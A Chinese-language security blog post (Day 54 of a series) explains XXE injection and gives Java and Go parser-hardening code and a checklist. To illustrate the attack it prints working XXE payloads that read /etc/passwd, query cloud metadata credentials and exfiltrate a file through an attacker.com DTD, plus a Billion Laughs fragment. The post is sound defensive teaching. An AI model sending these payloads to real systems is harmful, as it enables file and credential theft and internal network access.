---
title: "Day 54：XXE（XML External Entity Injection）— 當 XML 解析器幫攻擊者讀檔與打內網"
date: 2026-06-19
tags: ["XXE", "XML", "SSRF", "Java", "Go"]
---

# Day 54：XXE（XML External Entity Injection）— 當 XML 解析器幫攻擊者讀檔與打內網

接續 Day53 預告：昨天 SSRF 是「攻擊者控制伺服器要去**連誰**」；今天看一個經典的「藉由**解析格式**而觸發」的洞——XXE。攻擊者只要在 XML 裡塞一段外部實體宣告，你那台「乖乖照規格解析」的伺服器，就會替他讀本機檔案、甚至發出 SSRF 請求。

---

## 一、先搞懂罪魁禍首：DTD 與外部實體

XML 規格本身允許在文件裡定義「實體」（entity），像是一種變數：

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY hello "Hello World">
]>
<msg>&hello;</msg>
```

解析後 `&hello;` 會被展開成 `Hello World`。這部分還算無害。問題出在規格還允許「**外部實體**」——實體的內容可以來自一個 URI：

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<msg>&xxe;</msg>
```

當解析器看到 `&xxe;`，它會**真的去開** `file:///etc/passwd`，把檔案內容塞進 `&xxe;` 的位置。如果這個解析結果最後被回傳給使用者，攻擊者就讀到了你的本機檔案。這就是 XXE 的核心。

而 `SYSTEM` 後面的 URI 不限於 `file://`：

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
```

——看到熟悉的位址了嗎？這就是 XXE 直接退化成 SSRF（呼應 Day53）：你的解析器替攻擊者去打雲端 metadata、內網服務。**XXE 不只讀檔，它本質上是「讓 XML 解析器代你發出網路請求」。**

---

## 二、為什麼「預設設定就會中招」？

這是 XXE 最坑的地方：**很多 XML 解析器在預設情況下就會展開外部實體**。你沒寫任何「危險程式碼」，只是用最普通的方式解析了一份使用者上傳的 XML，洞就成立了。

哪裡會吃到使用者控制的 XML？比你想的多：

- 上傳 `.xml` / `.svg` / `.docx`（其實是 zip 裡的 XML）/ `.xlsx`
- SOAP / 舊式 XML-RPC API
- SAML 登入流程的 XML 斷言（很多 SSO 串接踩過）
- RSS / Atom / sitemap 匯入
- 任何「接收 `Content-Type: application/xml` 的 endpoint」

只要這些資料流進了一個「沒關掉 DTD」的解析器，就有風險。

---

## 三、攻擊手法不只一種

**1. 經典讀檔（in-band）**：如上，`&xxe;` 展開後直接出現在回應裡。

**2. SSRF**：把 `file://` 換成 `http://`，打內網或 metadata。

**3. Blind / OOB（Out-of-Band）**：如果回應看不到展開結果，攻擊者改用**參數實體**搭配外部 DTD，把讀到的檔案內容透過 DNS / HTTP 偷帶到自己的伺服器：

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
```

`evil.dtd` 裡再把 `%file;` 拼進一個指向 `attacker.com` 的 URL，外洩內容。所以「我沒把解析結果回傳給使用者」**不等於安全**。

**4. Billion Laughs（XML 炸彈 / DoS）**：用實體層層巢狀引用自己，把一份幾 KB 的 XML 在記憶體展開成幾 GB，打爆服務：

```xml
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!-- ...一路放大到 lol9，記憶體爆炸 -->
```

防禦的共同根源都一樣：**禁用 DTD、禁用外部實體**。

---

## 四、Java：把 DTD 與外部實體關到死

Java 的 XML 處理是 XXE 重災區，因為 `DocumentBuilderFactory`、`SAXParserFactory`、`XMLInputFactory`、`TransformerFactory`、`SAXReader`（JDOM/dom4j）等**預設大多會展開外部實體**。最乾淨、最該優先採用的做法是**直接禁用 DTD**——對絕大多數應用而言根本用不到 DTD，關掉就一勞永逸。

```java
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.XMLConstants;
import org.w3c.dom.Document;
import java.io.InputStream;

public class SafeXmlParser {

    public static Document parse(InputStream xml) throws Exception {
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();

        // 最強且最簡單的一招：完全禁止 DOCTYPE 宣告。
        // 一旦文件含 <!DOCTYPE ...> 就直接拋例外 —— 連入口都封死。
        dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

        // 雙保險：明確關閉一般外部實體與參數實體
        dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
        dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

        // 不載入外部 DTD
        dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);

        // 開啟 JAXP 安全處理模式（會套用 entity 展開上限，緩解 Billion Laughs）
        dbf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);

        // 不展開 entity reference，避免殘留展開行為
        dbf.setExpandEntityReferences(false);
        dbf.setXIncludeAware(false);   // 一併關掉 XInclude
        dbf.setNamespaceAware(true);

        DocumentBuilder db = dbf.newDocumentBuilder();
        return db.parse(xml);
    }
}
```

幾個重點：

- `disallow-doctype-decl = true` 是 OWASP 對 Java DOM/SAX 的首選建議——只要應用不需要 DTD，這一行就把 XXE 與 XML 炸彈一起解決。
- 如果你**真的需要保留 DTD**（少數情境），退而求其次：把 `external-general-entities` 與 `external-parameter-entities` 設為 `false`，至少擋掉外部實體。
- 其他 API 同理要設：
  - `SAXParserFactory` / `XMLReader`：設一樣的 feature。
  - `XMLInputFactory`（StAX）：`xmlif.setProperty(XMLInputFactory.SUPPORT_DTD, false);` 以及 `IS_SUPPORTING_EXTERNAL_ENTITIES = false`。
  - `TransformerFactory` / `SAXTransformerFactory`：設 `XMLConstants.ACCESS_EXTERNAL_DTD` 與 `ACCESS_EXTERNAL_STYLESHEET` 為空字串 `""`。
- 注意 `FEATURE_SECURE_PROCESSING` 只是「緩解」（套用展開次數/大小上限），不等於關閉外部實體——別只設它就以為安全。

> 小提醒：不同 parser 實作對未知 feature 會丟 `ParserConfigurationException`。建議把每個 `setFeature` 包好並記錄，確保你用的實作（Xerces 等）確實吃到設定，而不是被默默忽略。

---

## 五、Go：為什麼標準 `encoding/xml` 天生免疫，但仍有地雷

好消息：Go 標準函式庫的 `encoding/xml` **不支援展開外部實體，也不會去抓 `SYSTEM` 指向的 URI**。它對 DTD 內的實體基本上是忽略/不解析外部資源，所以用標準庫解析時，傳統的 `file:///etc/passwd` 那種 XXE **打不進來**。這是 Go 在這題上的先天優勢。

但「不會中經典 XXE」不代表你可以閉著眼睛收 XML。仍要注意：

```go
package main

import (
	"encoding/xml"
	"errors"
	"io"
	"strings"
)

type Message struct {
	Body string `xml:"body"`
}

// 包一層：限制大小 + 簡單拒絕含 DOCTYPE 的輸入，作為縱深防禦
func ParseMessage(r io.Reader) (*Message, error) {
	// 1. 限制讀取大小，避免超大 XML / 實體炸彈式 DoS
	limited := io.LimitReader(r, 1<<20) // 1MB 上限
	data, err := io.ReadAll(limited)
	if err != nil {
		return nil, err
	}

	// 2. 縱深防禦：若你的業務根本用不到 DTD，直接拒絕含 DOCTYPE 的文件
	//    （標準庫雖不擴展外部實體，明確拒絕仍能擋掉某些第三方解析路徑的風險）
	if strings.Contains(strings.ToLower(string(data)), "<!doctype") {
		return nil, errors.New("不接受含 DOCTYPE 的 XML")
	}

	var msg Message
	dec := xml.NewDecoder(strings.NewReader(string(data)))
	// 注意：dec.Entity 預設為 nil（只認 XML 內建的 5 個實體如 &lt;）。
	// 千萬不要為了「方便」自己塞一張會解析外部資源的 entity map 進去。
	if err := dec.Decode(&msg); err != nil {
		return nil, err
	}
	return &msg, nil
}
```

Go 的真正地雷在於**第三方解析器與 C 綁定**：

- 任何透過 cgo 包 `libxml2` 的套件（例如某些 `libxml2` binding）會**繼承 libxml2 的 XXE 風險**，因為 libxml2 在舊版本預設會載入外部實體。用這類套件時，務必呼叫其關閉 DTD/外部實體的選項（如設定 `XML_PARSE_NONET`、不帶 `XML_PARSE_NOENT` 等 parser flag）。
- 解析 SVG、Office 文件（內含 XML）、SAML 時，如果底層不是 `encoding/xml` 而是別的引擎，要回頭確認該引擎的設定。

**結論：Go 標準庫安全，但「你用的是不是標準庫」要自己確認**——這正是偏好「文件查證」的好理由：先確認套件底層用什麼解析器、是否仍在維護、有沒有提供關閉外部實體的選項，再決定怎麼設。

---

## 六、容易被忽略的細節

1. **副檔名會騙人**：`.docx`、`.xlsx`、`.pptx`、`.svg`、`.gpx`、`.kml` 本質上都是 XML（前三者是裝在 zip 裡）。處理「圖片」「文件」上傳時，別忘了它們其實會經過 XML 解析器。
2. **Blind XXE 不需要回顯**：就算你不把解析結果回給使用者，OOB 手法仍能透過 DNS/HTTP 外洩資料。「沒回傳」不是防禦。
3. **SAML / SSO 是高風險區**：身份斷言用 XML，歷史上爆過多次 XXE。用成熟、有在維護的 SAML 函式庫，並確認它已關閉外部實體。
4. **設定要驗證有生效**：Java 不同 parser 對未知 feature 行為不一；設了卻被忽略等於沒設。寫一個「丟帶外部實體的 payload 進去應該要被拒」的測試把它釘住。
5. **XInclude 也是漏網之魚**：`setXIncludeAware(false)`，否則 `<xi:include href="file:///...">` 同樣能讀檔。
6. **錯誤訊息別洩漏**：解析失敗時別把檔案路徑、堆疊、實體展開內容原樣回給使用者（同 Day53 的 blind 探測道理）。

---

## 七、後端工程師的 Checklist

- [ ] 找出所有「會吃到使用者 XML」的入口：上傳（含 docx/svg/xlsx）、SOAP、SAML、RSS、`application/xml` endpoint。
- [ ] **Java 首選**：`disallow-doctype-decl = true`，直接禁用 DOCTYPE。
- [ ] Java 退而求其次：關閉 `external-general-entities`、`external-parameter-entities`、`load-external-dtd`。
- [ ] Java 對 SAX / StAX / Transformer / 第三方（dom4j、JDOM）逐一套用相同設定，`ACCESS_EXTERNAL_DTD` / `ACCESS_EXTERNAL_STYLESHEET` 設為 `""`。
- [ ] **Go**：優先用標準 `encoding/xml`（不擴展外部實體）；別自訂會抓外部資源的 `Decoder.Entity`。
- [ ] Go 若用 libxml2 等第三方/cgo 解析器，明確帶上禁用外部實體與聯網的 flag，並確認套件仍在維護。
- [ ] 一律限制 XML 大小與巢狀深度，緩解 Billion Laughs。
- [ ] 關閉 XInclude；解析錯誤訊息模糊化。
- [ ] 寫一個「帶外部實體的 payload 必須被拒絕」的單元測試，確保設定真的生效。

---

## 八、一句話總結

> **XXE 的本質是「XML 解析器照規格去開外部實體，等於替攻擊者讀檔與發請求」。防禦核心極簡：用不到 DTD 就直接禁用 DOCTYPE（Java 一行搞定），Go 則優先用先天免疫的標準 `encoding/xml`。**
> 別忘了 docx/svg/SAML 都藏著 XML，且 blind XXE 不需要回顯也能外洩資料。

---

## 延伸閱讀

- OWASP — XML External Entity (XXE) Prevention Cheat Sheet
- OWASP — A05:2021 Security Misconfiguration（XXE 在此分類下）
- Java — `XMLConstants.FEATURE_SECURE_PROCESSING`、`ACCESS_EXTERNAL_DTD` 文件
- Go — `encoding/xml` 套件文件（外部實體行為）
- 前文：Day53 SSRF（XXE 可退化成 SSRF）、Day44 ZIP Slip（同為解析使用者檔案的風險）

---

明天預告：**Day 55 — Mass Assignment / Auto-Binding 漏洞：當框架「貼心」地把整包 JSON 灌進你的物件**
（今天 XXE 是「解析格式」觸發的洞；明天看一個「框架自動綁定」帶來的授權繞過——使用者在 request body 多塞一個 `isAdmin=true` 或 `role=ADMIN`，框架就忠實地把它綁到你的 entity 上，悄悄完成提權。會講為什麼方便的 auto-binding 是雙面刃，並用 Java（Spring 的 `@RequestBody` 直接綁 entity 的反例，與 DTO/白名單欄位、`@JsonIgnore`、allow-list binding 的正解）與 Go（`json.Unmarshal` 直接灌進 model 的陷阱，與明確 DTO + 欄位白名單的寫法）示範如何只接受你允許被修改的欄位。）
